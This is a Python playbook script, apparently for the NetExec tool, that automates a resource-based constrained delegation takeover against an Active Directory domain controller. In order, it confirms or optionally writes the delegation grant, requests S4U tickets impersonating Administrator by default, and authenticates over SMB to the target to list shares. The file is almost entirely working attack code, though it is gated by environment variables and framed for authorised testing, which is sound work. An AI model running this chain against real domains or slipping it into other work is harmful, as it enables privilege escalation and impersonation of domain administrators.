"""RBCD takeover: confirm a delegation grant, request an S4U ticket, verify access.

Given a SOURCE account you control (authenticate as it with -u/-p, -H, or -k) and a
TARGET computer whose ``msDS-AllowedToActOnBehalfOfOtherIdentity`` lists that
SOURCE, this walks the resource-based constrained delegation (RBCD) attack
end to end against a DC:

  1. ``rbcd`` (read)      — confirm SOURCE's SID is in TARGET's allow list.
  2. ``delegation`` (S4U) — as SOURCE, request an S4U2Self+S4U2Proxy service
                            ticket impersonating a chosen user to TARGET's service.
  3. verify               — load that ccache and open SMB to TARGET over Kerberos,
                            reporting whether the impersonation actually works.

This is an ACTIVE chain. Step 2 requests tickets from the KDC and step 3
authenticates to the resource as the impersonated user. With NXC_RBCD_WRITE=1 it
will also *add* the grant (an LDAP write to TARGET) when it is missing; without it,
a missing grant stops the chain. Point ``<dc>`` at the domain controller and pass
the resource host to ``--allow-target`` so step 3 can reach it.

Configuration is read from the environment so the chain never runs by accident:

    NXC_RBCD_TARGET       resource computer account, e.g. WS02$            (required)
    NXC_RBCD_SOURCE       delegating account you authenticate as, e.g. WS01$ (required)
    NXC_RBCD_IMPERSONATE  user to impersonate (default: Administrator)
    NXC_RBCD_SPN          explicit target SPN, e.g. cifs/ws02.example.test (optional)
    NXC_RBCD_VERIFY_HOST  host to verify against over Kerberos (optional; --allow-target)
    NXC_RBCD_WRITE        set to 1 to add the grant when it is absent  (default: off)

    export NXC_RBCD_TARGET='WS02$' NXC_RBCD_SOURCE='WS01$' NXC_RBCD_VERIFY_HOST=10.0.0.52
    nxc playbook dc01.example.test examples/playbooks/chains/rbcd_takeover.py \
        -u 'WS01$' -H <nthash> -d example.test --allow-target 10.0.0.52

The ccache path is always reported (even if the automated verify cannot use it), so
you can set KRB5CCNAME and continue with other Kerberos-aware tools.
"""

import os
from dataclasses import dataclass, field


@dataclass
class RBCDTakeover:
    target: str
    source: str
    impersonate: str
    source_sid: str | None = None
    target_dn: str | None = None
    target_spns: list[str] = field(default_factory=list)
    grant_present: bool = False
    grant_added: bool = False
    spn: str | None = None
    ccache: str | None = None
    expires_at: int | None = None
    verify_host: str | None = None
    verify_authenticated: bool | None = None
    verify_admin: bool | None = None
    reached: bool = False
    reason: str | None = None
    evidence_indices: list[int] = field(default_factory=list)


def _env(name, default=None):
    value = os.environ.get(name, "").strip()
    return value or default


def run(host):
    host.defaults(stop_on_error=False)
    target = _env("NXC_RBCD_TARGET")
    source = _env("NXC_RBCD_SOURCE")
    impersonate = _env("NXC_RBCD_IMPERSONATE", "Administrator")
    spn = _env("NXC_RBCD_SPN")
    verify_host = _env("NXC_RBCD_VERIFY_HOST")
    write = _env("NXC_RBCD_WRITE") == "1"
    data = RBCDTakeover(target=target or "", source=source or "", impersonate=impersonate, verify_host=verify_host)

    with host.evidence() as ev:

        def finish(reason=None):
            data.reason = reason
            data.evidence_indices = list(ev.indices)
            return host.finding("rbcd_takeover", ok=data.reached, data=data, inputs={"target": data.target, "source": data.source, "impersonate": impersonate, "write": write, "evidence": ev.indices})

        if not target or not source:
            return finish("Set NXC_RBCD_TARGET and NXC_RBCD_SOURCE (and authenticate as SOURCE)")

        ldap = host.ldap()
        if not ldap.authenticated:
            return finish("Directory authentication as the SOURCE account was not established")

        # Step 1 — confirm the RBCD grant (optionally add it first when writing).
        if write:
            added = ldap.module("rbcd", target=target, source=source, action="add")
            data.grant_added = bool(added.ok and getattr(added.data, "modified", False))
        rb = ldap.module("rbcd", target=target, source=source, action="read")
        data.source_sid = getattr(rb.data, "source_sid", None)
        data.target_dn = getattr(rb.data, "target_dn", None)
        data.target_spns = list(getattr(rb.data, "target_spns", []) or [])
        data.grant_present = rb.ok  # read returns SUCCESS only when SOURCE's SID is present
        if not data.grant_present:
            if rb.error:
                return finish(f"RBCD read failed on {target}: {rb.error}")
            hint = "" if write else "; set NXC_RBCD_WRITE=1 to add it"
            return finish(f"{source} is not allowed to act on {target}{hint}")

        # Step 2 — request the delegated service ticket as SOURCE.
        delegated = ldap.module("delegation", user=impersonate, **({"spn": spn} if spn else {}))
        data.spn = getattr(delegated.data, "requested_spn", None) or spn
        data.ccache = getattr(delegated.data, "ccache", None)
        data.expires_at = getattr(delegated.data, "expires_at", None)
        if not delegated.ok or not data.ccache:
            return finish(delegated.error or "S4U ticket request did not produce a ccache (try setting NXC_RBCD_SPN)")

        # Step 3 — verify by authenticating to the resource with the delegated ticket.
        if not verify_host:
            data.reached = True  # grant confirmed + ticket obtained; no host to verify against
            return finish("Verification host not set (NXC_RBCD_VERIFY_HOST); ticket obtained")
        try:
            resource = host.at(verify_host)
        except ValueError:
            data.reached = True
            return finish(f"{verify_host} is outside --allow-target; ticket obtained but not verified")

        os.environ["KRB5CCNAME"] = data.ccache
        smb = resource.smb(use_kcache=True, kerberos=True, kdcHost=host.target, domain=getattr(ldap.connection, "domain", None))
        data.verify_authenticated = smb.authenticated
        data.verify_admin = smb.admin
        data.reached = bool(smb.authenticated)
        if data.reached:
            smb.shares()
        return finish(None if data.reached else "Delegated ticket did not authenticate to the resource over Kerberos")
